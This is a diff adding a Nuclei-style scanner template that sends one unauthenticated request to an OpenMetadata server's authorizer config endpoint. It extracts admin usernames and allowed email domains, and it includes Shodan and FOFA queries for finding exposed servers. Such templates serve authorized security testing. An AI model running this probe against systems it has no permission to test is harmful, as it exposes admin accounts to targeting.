@@ -1,0 +1,51 @@
+id: openmetadata-admin-userenum
+
+info:
+  name: OpenMetadata - Admin User Enumeration
+  author: icarot
+  severity: medium
+  description: |
+    Enumerates the admin users registered on OpenMetadata server.
+  reference:
+    - https://github.com/open-metadata/OpenMetadata
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="OpenMetadata"
+    shodan-query: title:"OpenMetadata"
+    vendor: open-metadata
+    product: openmetadata
+  tags: openmetadata,open-metadata,userenum,discovery
+
+http:
+  - raw:
+      - |
+        GET /api/v1/system/config/authorizer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"adminPrincipals":'
+          - '"principalDomain"'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        json:
+          - '"adminUser: " + ( .adminPrincipals[] | tostring )'
+          - '"principalDomain: " + .principalDomain'
+          - '"allowedDomains: " + ( .allowedEmailRegistrationDomains[] | tostring )'
+# digest: 4a0a00473045022013aaeb346ef8f0127a76a10ed03abd4a80171cf38abd11f31333fd088f6ed5c0022100dbe478ca1f439a7e62ada6b94d15c50530e6f08b3ff90a894fd9fbae87d90981:922c64590222798bb761d5b6d8e72950
